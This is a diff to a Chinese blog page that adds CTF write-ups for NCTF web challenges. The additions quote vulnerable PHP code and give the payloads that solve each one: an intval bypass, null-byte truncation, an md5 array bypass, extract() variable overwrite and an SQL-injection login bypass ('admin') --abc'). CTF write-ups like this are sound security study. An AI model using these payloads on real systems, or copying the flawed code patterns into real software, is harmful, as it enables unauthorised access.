@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="绿生 | Cyris">
 <meta property="og:description" content="南邮NCTF训练平台里一些题的wp。">
 <meta property="og:image" content="http://i.imgur.com/H0XI1Wo.png">
-<meta property="og:updated_time" content="2017-06-18T08:45:22.950Z">
+<meta property="og:updated_time" content="2017-06-19T04:18:06.560Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="NCTF WriteUp">
 <meta name="twitter:description" content="南邮NCTF训练平台里一些题的wp。">
@@ -192,7 +192,7 @@
   <div id="toc-article" class="toc-article">
       <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
     <strong class="toc-title">文章目录</strong>
-           <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-签到2-50"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 签到2 50</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-这题不是WEB-100"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 这题不是WEB 100</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-层层递进-100"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 层层递进 100</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-AAencode-100"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 AAencode 100</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-文件包含-100"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 文件包含 100</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-Download-200"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 Download~! 200</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-md5-collision-50"><span class="toc-number">1.7.</span> <span class="toc-text">0x07 md5 collision 50</span></a></li></ol></li></ol>
+           <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-签到2-50"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 签到2 50</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-这题不是WEB-100"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 这题不是WEB 100</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-层层递进-100"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 层层递进 100</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-AAencode-100"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 AAencode 100</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-文件包含-100"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 文件包含 100</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-Download-200"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 Download~! 200</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-md5-collision-50"><span class="toc-number">1.7.</span> <span class="toc-text">0x07 md5 collision 50</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-MYSQL-200"><span class="toc-number">1.8.</span> <span class="toc-text">0x08 MYSQL 200</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-x00-200"><span class="toc-number">1.9.</span> <span class="toc-text">0x09 /x00 200</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-bypass-again-200"><span class="toc-number">1.10.</span> <span class="toc-text">0x10 bypass again 200</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-变量覆盖-200"><span class="toc-number">1.11.</span> <span class="toc-text">0x11 变量覆盖 200</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-SQL注入1-300"><span class="toc-number">1.12.</span> <span class="toc-text">0x12 SQL注入1 300</span></a></li></ol></li></ol>
          </div>
    <script type="text/javascript">
   function showToc(){
@@ -267,7 +267,45 @@ Both of the strings are converted to 0 when compared with ==, if you want to com
 </code></pre><p>构造：  </p>
 <pre><code>http://chinalover.sinaapp.com/web19/?a=240610708
 </code></pre><p>得到flag：  </p>
-<pre><code>nctf{md5_collision_is_easy}     
+<pre><code>nctf{md5_collision_is_easy}    
+</code></pre><h2 id="0x08-MYSQL-200"><a href="#0x08-MYSQL-200" class="headerlink" title="0x08 MYSQL 200"></a>0x08 MYSQL 200</h2><p>URL: <a href="http://chinalover.sinaapp.com/web11/" target="_blank" rel="external">http://chinalover.sinaapp.com/web11/</a></p>
+<p>按提示看了波robots.txt，构造：</p>
+<pre><code>http://chinalover.sinaapp.com/web11/robots.txt
+</code></pre><p>得到TIP与源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">TIP:sql.php</div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_GET[id]) &#123;</div><div class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</div><div class="line">  mysql_select_db(SAE_MYSQL_DB);</div><div class="line">  $id = intval($_GET[id]);</div><div class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select content from ctf2 where id='$id'"</span>));</div><div class="line">  <span class="keyword">if</span> ($_GET[id]==<span class="number">1024</span>) &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span>($query[content]);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>可以得出flag在sql.php下，需要传入id值，注意到intval函数，这里做了个int型的强转换，于是构造：  </p>
+<pre><code>http://chinalover.sinaapp.com/web11/sql.php?id=1024.1
+</code></pre><p>得到flag：</p>
+<pre><code>the flag is:nctf{query_in_mysql}
+</code></pre><h2 id="0x09-x00-200"><a href="#0x09-x00-200" class="headerlink" title="0x09 /x00 200"></a>0x09 /x00 200</h2><p>URL: <a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php" target="_blank" rel="external">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php</a>   </p>
+<p>view-source:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</div><div class="line">        <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</div><div class="line">            <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </div><div class="line">            <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</div><div class="line">        <span class="keyword">else</span></div><div class="line">            <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>这里学了一个00截断。首先要满足传入的值是数字，然后又要传入#biubiubiu，用字符截断构造payload： </p>
+<pre><code>http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=1%00%23biubiubiu
+</code></pre><p>得到flag：</p>
+<pre><code>Flag: flag:nctf{use_00_to_jieduan}
+</code></pre><h2 id="0x10-bypass-again-200"><a href="#0x10-bypass-again-200" class="headerlink" title="0x10 bypass again 200"></a>0x10 bypass again 200</h2><p>URL: <a href="http://chinalover.sinaapp.com/web17/index.php" target="_blank" rel="external">http://chinalover.sinaapp.com/web17/index.php</a>   </p>
+<p>源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>])) &#123;</div><div class="line"><span class="keyword">if</span> ($_GET[<span class="string">'a'</span>] != $_GET[<span class="string">'b'</span>])</div><div class="line"><span class="keyword">if</span> (md5($_GET[<span class="string">'a'</span>]) === md5($_GET[<span class="string">'b'</span>]))</div><div class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="keyword">print</span> <span class="string">'Wrong.'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>之前有做过类似的，直接构造:   </p>
+<pre><code>http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=2
+</code></pre><p>flag：   </p>
+<pre><code>Flag: nctf{php_is_so_cool}
+</code></pre><h2 id="0x11-变量覆盖-200"><a href="#0x11-变量覆盖-200" class="headerlink" title="0x11 变量覆盖 200"></a>0x11 变量覆盖 200</h2><p>URL: <a href="http://chinalover.sinaapp.com/web18/index.php" target="_blank" rel="external">http://chinalover.sinaapp.com/web18/index.php</a>   </p>
+<p>先看一波source:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php if ($_SERVER["REQUEST_METHOD"] == "POST") &#123; ?&gt;</div><div class="line">                        &lt;?php</div><div class="line">                        extract($_POST);</div><div class="line">                        if ($pass == $thepassword_123) &#123; ?&gt;</div><div class="line">                            &lt;div class="alert alert-success"&gt;</div><div class="line">                                &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;</div><div class="line">                            &lt;/div&gt;</div><div class="line">                        &lt;?php &#125; ?&gt;</div><div class="line">                    &lt;?php &#125; ?&gt;</div></pre></td></tr></table></figure></p>
+<p>题目很明显了的变量覆盖，上hackbar发个post：  </p>
+<pre><code>pass=1&amp;thepassword_123=1
+</code></pre><p>即可拿到flag：  </p>
+<pre><code>nctf{bian_liang_fu_gai!}
+</code></pre><p>这里有个extract函数，可以看看这个：<a href="http://www.w3school.com.cn/php/func_array_extract.asp" target="_blank" rel="external">http://www.w3school.com.cn/php/func_array_extract.asp</a></p>
+<h2 id="0x12-SQL注入1-300"><a href="#0x12-SQL注入1-300" class="headerlink" title="0x12 SQL注入1 300"></a>0x12 SQL注入1 300</h2><p>URL: <a href="http://chinalover.sinaapp.com/index.php" target="_blank" rel="external">http://chinalover.sinaapp.com/index.php</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</div><div class="line">    mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</div><div class="line">  mysql_select_db(SAE_MYSQL_DB);</div><div class="line">  $user = trim($_POST[user]);</div><div class="line">  $pass = md5(trim($_POST[pass]));</div><div class="line">  $sql=<span class="string">"select user from ctf where (user='"</span>.$user.<span class="string">"') and (pw='"</span>.$pass.<span class="string">"')"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>.$sql;</div><div class="line">  $query = mysql_fetch_array(mysql_query($sql));</div><div class="line">  <span class="keyword">if</span>($query[user]==<span class="string">"admin"</span>) &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span>($query[user] != <span class="string">"admin"</span>) &#123;</div><div class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> $query[user];</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>抓住这句：</p>
+<pre><code>$sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;;
+</code></pre><p>尝试user=admin’)提前闭合的方法，只能看到一条warning</p>
+<pre><code>Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in index.php on line 14
+</code></pre><p>于是构造新的payload把后面的语句注释掉</p>
+<pre><code>admin&apos;) --abc
+</code></pre><p>提交拿到flag</p>
+<pre><code>Logged in! flag:nctf{ni_ye_hui_sql?}
 </code></pre>
       
 
@@ -328,8 +366,8 @@ Both of the strings are converted to 0 when compared with ==, if you want to com
 		<p style="text-align:justify">	
 		&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
 		最后更新：
-            <time datetime="2017-06-18T08:45:22.950Z" itemprop="dateLastModified">
-            2017-06-18
+            <time datetime="2017-06-19T04:18:06.560Z" itemprop="dateLastModified">
+            2017-06-19
             </time>
         </div>
         <br>
@@ -473,15 +511,15 @@ var _hmt = _hmt || [];
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">C++</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">樱花</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">绿生</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">C++</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -505,11 +543,11 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Hexo</a>
+                <a href="javascript:void(0)" class="js-tag color4">一些书</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">一些书</a>
+                <a href="javascript:void(0)" class="js-tag color5">Hexo</a>
               </li>
             
             <div class="clearfix"></div>
